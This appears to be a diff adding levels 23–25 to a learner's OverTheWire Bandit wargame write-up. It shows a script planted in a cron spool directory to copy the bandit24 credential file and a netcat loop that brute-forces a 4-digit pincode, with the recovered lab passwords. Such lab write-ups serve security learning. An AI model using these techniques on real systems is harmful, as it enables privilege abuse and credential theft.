@@ -1562,3 +1562,92 @@ How to read and understand shell scripts written by others, follow the logic of 
 - cron and crontab for scheduled job management
 - bash script analysis and execution
 
+# Level 23 → Level 24
+Create a shell script to leverage a cron job running as bandit24
+
+## My solve
+I checked the cron jobs in /etc/cron.d/ and found a script running as bandit24. The script executes any files in /var/spool/bandit24 owned by bandit23, then deletes them. 
+
+I created a simple script to copy the bandit24 password to a readable location, made it executable, and placed it in the spool directory for the cron job to execute.
+
+```bash
+bandit23@bandit:~$ ls
+bandit23@bandit:~$ mktemp -d
+/tmp/tmp.2f6Cw9390z
+bandit23@bandit:~$ ^C
+bandit23@bandit:~$ cd /tmp/tmp.2f6Cw9390z
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ nano run.sh
+
+run.sh file is
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.2f6Cw9390z/pass
+
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ touch pass
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ chmod -R /tmp/tmp.2f6Cw9390z
+chmod: missing operand after ‘/tmp/tmp.2f6Cw9390z’
+Try 'chmod --help' for more information.
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ chmod -R /tmp/tmp.2f6Cw9390z/
+chmod: missing operand after ‘/tmp/tmp.2f6Cw9390z/’
+Try 'chmod --help' for more information.
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ chmod 777 -R /tmp/tmp.2f6Cw9390z/
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ chmod +x run.sh
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ cp run.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.2f6Cw9390z$ cat pass
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+## What I learned
+- Using cron jobs to understand automated system tasks
+- Creating shell scripts to extract privileged information
+- Managing file permissions for proper execution
+
+## References 
+- chmod for setting file permissions
+- Basic bash scripting
+
+# Level 24 → Level 25
+Brute force a 4-digit pincode to a network service
+
+## My solve
+I needed to connect to a service on port 30002 that required the bandit24 password plus a 4-digit pincode. Since there are only 10,000 possible combinations (0000-9999), I created a script to try all possibilities.
+
+I wrote a bash script that generates all possible pincodes and submits them along with the password to the service until it finds the correct one.
+
+```bash
+run.sh file
+
+#!/bin/bash
+
+(for i in {0001..9999}; do
+echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done ) | nc localhost 30002
+
+bandit24@bandit:~$ mktemp -d | cd
+bandit24@bandit:~$ mktemp -d
+/tmp/tmp.hX62xiIM4d
+bandit24@bandit:~$ cd /tmp/tmp.hX62xiIM4d
+bandit24@bandit:/tmp/tmp.hX62xiIM4d$ nano run.sh
+Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit24@bandit:/tmp/tmp.hX62xiIM4d$ chmod +x run.sh
+bandit24@bandit:/tmp/tmp.hX62xiIM4d$ ./run.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+## What I learned
+- How to implement a simple brute force attack
+- Writing shell scripts to automate repetitive tasks
+- Working with network services via command line
+
+## References 
+- Bash scripting for loops
+- Using netcat to connect to network services
